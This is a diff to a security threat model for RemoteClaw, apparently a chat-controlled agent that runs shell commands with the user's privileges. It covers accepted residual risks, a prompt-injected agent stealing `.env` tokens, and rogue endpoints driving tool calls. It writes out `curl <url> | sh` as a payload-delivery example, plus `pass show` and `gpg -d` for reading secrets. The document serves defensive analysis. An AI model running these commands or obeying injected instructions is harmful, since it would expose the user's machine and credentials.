@@ -13,6 +13,21 @@ Analysis across all 7 MAESTRO layers identified **19 verified findings**: 1 Crit
 
 > **Inbound surface (clarification).** RemoteClaw exposes **no inbound network listener for its function** — Webex is an outbound Mercury WebSocket + REST client, inferd is outbound local IPC, and openai-compat is an outbound HTTP client. The *only* inbound socket is the optional health endpoint (`internal/agent/health.go`), plaintext HTTP bound to `127.0.0.1:9090` by default and opt-out via `health.enabled`. Findings N-1/N-2 concern what RemoteClaw *sends outbound*, not anything it serves. The only inbound-surface finding is C-7 (health addr not hard-pinned to loopback).
 
+> **Security posture (ADR 0004).** RemoteClaw runs with the **installing user's
+> privileges** — this is inherent to "remote hands for your machine" and is not a
+> defect. The controls below (allowlist, rate limit, dangerous-command checker,
+> challenge-response, in-process lockdown guard, audit) are **best-effort
+> defense-in-depth** that raise cost and narrow surface for a *remote* attacker
+> abusing the chat interface. They are **explicitly not** claimed to stop an
+> authenticated attacker who delivers and runs a payload (e.g. instructing
+> RemoteClaw to `curl <url> | sh`): that executes with the user's own privileges,
+> which RemoteClaw legitimately holds, and no checker/gate/least-privilege posture
+> prevents it. True containment requires an **external** sandbox (dedicated
+> VM/container/low-priv account), not a boundary RemoteClaw imposes on itself.
+> The operator accepts this residual risk. Consequently, findings below that
+> imply an in-process control is a *hard* boundary are scoped to "raises the bar,"
+> not "prevents."
+
 The refactor **reduced** two risks: the old "no integrity check on Ollama auto-pull" is gone (inferd owns the model; RemoteClaw pulls nothing), and RemoteClaw no longer requires AWS credentials in its own environment. `govulncheck` reports **0 vulnerabilities affecting the code** (go-jose CVE GO-2026-4945 was patched in the same PR).
 
 Three agentic risk factors are present: **Non-Determinism**, **Autonomy**, **Agent Identity**.
@@ -43,10 +58,11 @@ Three agentic risk factors are present: **Non-Determinism**, **Autonomy**, **Age
 
 ## Risk Summary
 
-Findings prefixed **N-** are new or materially changed by the refactor; **C-** are carried forward from the prior model and re-verified against current code; **R-** are risks the refactor removed or reduced.
+Findings prefixed **N-** are new or materially changed by the refactor; **C-** are carried forward from the prior model and re-verified against current code; **R-** are risks the refactor removed or reduced; **A-** are **accepted residual risks** (documented, inherent to the design — see ADR 0004).
 
 | # | ASI Threat ID | Layer | Title | Severity | L | I | Risk | Risk Factors | Traditional Framework |
 |---|---------------|-------|-------|----------|---|---|------|--------------|----------------------|
+| A-1 | T11, T2 | L3,L4,L7 | Authenticated attacker delivers & runs a payload (`curl \| sh`) with the user's privileges — **accepted, not preventable in-process** (ADR 0004) | Critical | 2 | 3 | 6 | Autonomy | CWE-78, OWASP A03, STRIDE:E |
 | C-1 | T2, T11 | L3,L4 | Unrestricted Shell Execution (execute_command) | Critical | 3 | 3 | 9 | Autonomy | CWE-78, OWASP A03, STRIDE:E |
 | N-1 | T9, T22, BV-11 | L1,L4,L6 | openai_base_url (outbound client) — No TLS/Scheme Enforcement (key + conversation in cleartext, MITM) | High | 2 | 3 | 6 | Agent Identity | CWE-319, OWASP A02, STRIDE:S |
 | N-2 | T47, T13, T12 | L7 | Rogue/Compromised openai-compat Endpoint Drives Tool Calls (outbound trust) | High | 2 | 3 | 6 | Non-Det, Autonomy | CWE-345, LLM01, STRIDE:T |
@@ -74,8 +90,8 @@ Findings prefixed **N-** are new or materially changed by the refactor; **C-** a
 | R-1 | T1 — No integrity check on Ollama model auto-pull (was HIGH) | **Removed.** inferd owns the model lifecycle; RemoteClaw performs no model pull. |
 | R-2 | T22 — AWS credentials required in RemoteClaw's environment | **Removed.** Bedrock reached (if at all) via an openai-compat gateway; no AWS SDK, no AWS creds. |
 | R-3 | Dependency CVE (GO-2026-4945, go-jose) | **Patched** to go-jose/go-jose/v4 v4.1.4 in the same PR. |
-| R-4 | T22 — `read_file(".env")` exfil of tokens by a prompt-injected agent | **Mitigated.** Secrets move to `pass` (encrypted, no readable file), and the lockdown guard + OS file ownership deny the agent's tools access to config/`.env`/store (ADR 0003). Residual: a shell-capable agent may still call `pass show` unless OS enforcement (low-priv service account) is in place — which is why OS enforcement, not the in-process guard, is the real boundary. |
-| R-5 | T3 — RemoteClaw runs as root/SYSTEM (was HIGH, C-3) | **Mitigated when lockdown+OS enforcement is used.** Installer can run the service as a dedicated low-privilege account (`install --user`), so config/secrets owned by root are unreadable by the agent. Still operator-dependent; documented. |
+| R-4 | T22 — `read_file(".env")` exfil of tokens by a prompt-injected agent | **Reduced (best-effort).** Secrets move to `pass` (encrypted, no readable file), and the lockdown guard denies the agent's *file tools* on config/`.env`/store (ADR 0003). Residual, per ADR 0004: a shell-capable agent running as the user can still `pass show` / `gpg -d` / read via a crafted command — no in-process control fully prevents this. The guard raises the bar; it is not a hard boundary. |
+| R-5 | T3 — RemoteClaw runs as root/SYSTEM (was HIGH, C-3) | **Partially reduced; reframed by ADR 0004.** The installer can run under a dedicated low-privilege account (`install --user`), reducing blast radius vs. root. But RemoteClaw fundamentally runs with the **installing user's** privileges by design — it is not, and cannot make itself, isolated from the user it acts for. "Config unreadable by the agent even as admin" is **not** achievable in-process (you cannot setuid to a different unprivileged user); it needs an external sandbox. Treated as accepted residual risk, not a solved finding. |
 
 ## Layer Analysis
 
